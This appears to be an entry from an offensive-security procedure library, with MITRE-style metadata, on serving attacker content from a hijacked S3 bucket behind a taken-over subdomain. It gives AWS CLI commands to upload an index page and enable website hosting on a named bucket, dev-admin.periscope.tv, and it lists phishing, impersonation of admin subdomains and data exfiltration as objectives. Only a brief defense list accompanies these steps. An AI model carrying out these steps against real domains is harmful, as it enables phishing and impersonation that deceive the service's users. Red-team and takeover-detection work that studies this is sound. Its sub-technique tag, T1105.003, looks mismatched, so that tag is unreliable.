---
tags:
  - s3-upload
  - phishing-hosting
  - subdomain-hijack
type: procedure
tools:
  - '[[tools/AWS-CLI]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/aws-upload-file]]'
verified: false
platforms:
  - AWS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T04:38:39.733Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques:
  - '[[T1105.003]]'
id: e713e22f-2058-4c70-9bc8-4e1e0aad8389
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Upload Content to Hijacked S3 Bucket

## Summary

This procedure uploads custom files to a claimed S3 bucket to serve arbitrary content via the hijacked subdomain, enabling attacks like phishing or defacement.

## Description

After claiming the bucket, enable static website hosting and upload an index.html file to the root. The DNS record will now route traffic to the attacker's content. For the dev-admin.periscope.tv example, uploading to us-west-2 makes http://dev-admin.periscope.tv serve the file. This can impersonate the service, especially for admin subdomains.

## Requirements

1. Owned S3 bucket from prior claiming step
2. AWS CLI configured
3. Custom content file (e.g., HTML for phishing)

## Defense

Defensive measures and detection strategies:

- Enable S3 access logging and monitor uploads via CloudTrail
- Set bucket policies to block public website hosting on sensitive names
- Scan for subdomain takeovers using tools like Subjack or Takeover

## Objectives

1. Host malicious content on the subdomain
2. Verify serving of uploaded files
3. Achieve impact like user deception or data exfiltration

## Instructions

### Step 1: Prepare and Upload File

**Context**: Create and upload an index file to override default bucket behavior.

**Command** ([[commands/aws-upload-file]]):
```bash
echo '<h1>Taken Over</h1>' > index.html
aws s3 cp index.html s3://dev-admin.periscope.tv/ --region us-west-2
```

> This copies the file to the bucket root. The bucket will serve index.html by default for website requests.

### Step 2: Enable Website Hosting

**Context**: Configure the bucket for static website serving if not already set.

**Command** ([[commands/aws-enable-website]]):
```bash
aws s3 website s3://dev-admin.periscope.tv/ --index-document index.html --region us-west-2
```

> This enables public access to the website endpoint, making content live.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Remote File Copy]]

### Sub-Techniques

- [[T1105.003]]

## Commands Used

- [[commands/aws-upload-file]]
- [[commands/aws-enable-website]]

## Tools Used

- [[tools/AWS-CLI]]

## Tags

- [[s3-upload]]
- [[phishing-hosting]]
